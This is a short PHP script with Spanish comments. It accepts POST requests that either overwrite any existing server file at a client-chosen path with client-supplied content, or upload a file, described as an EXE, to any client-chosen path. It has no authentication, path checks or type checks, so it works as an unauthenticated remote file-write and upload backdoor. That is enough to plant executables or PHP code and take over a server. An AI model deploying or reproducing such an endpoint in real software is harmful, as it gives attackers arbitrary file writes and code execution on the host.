<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Caso 1: Actualización del contenido de un archivo de texto
    if (isset($_POST['file_path']) && isset($_POST['content'])) {
        $filePath = $_POST['file_path'];
        $content = $_POST['content'];

        // Verificar si la ruta del archivo es válida
        if (file_exists($filePath)) {
            // Intentar escribir en el archivo
            if (file_put_contents($filePath, $content) !== false) {
                echo "Archivo actualizado correctamente.";
            } else {
                http_response_code(500);
                echo "Error al guardar el archivo.";
            }
        } else {
            http_response_code(404);
            echo "El archivo no existe.";
        }
    } 
    // Caso 2: Subida de un archivo EXE
    elseif (isset($_FILES['file']) && isset($_POST['targetPath'])) {
        $file = $_FILES['file'];
        $targetPath = $_POST['targetPath'];

        // Verificar si el archivo se subió sin errores
        if ($file['error'] === UPLOAD_ERR_OK) {
            // Mover el archivo subido a la ruta de destino
            if (move_uploaded_file($file['tmp_name'], $targetPath)) {
                echo "Archivo subido correctamente.";
            } else {
                http_response_code(500);
                echo "Error al subir el archivo.";
            }
        } else {
            http_response_code(500);
            echo "Error durante la subida del archivo.";
        }
    } 
    else {
        http_response_code(400);
        echo "Datos insuficientes proporcionados.";
    }
} 
else {
    http_response_code(405);
    echo "Método no permitido.";
}
?>
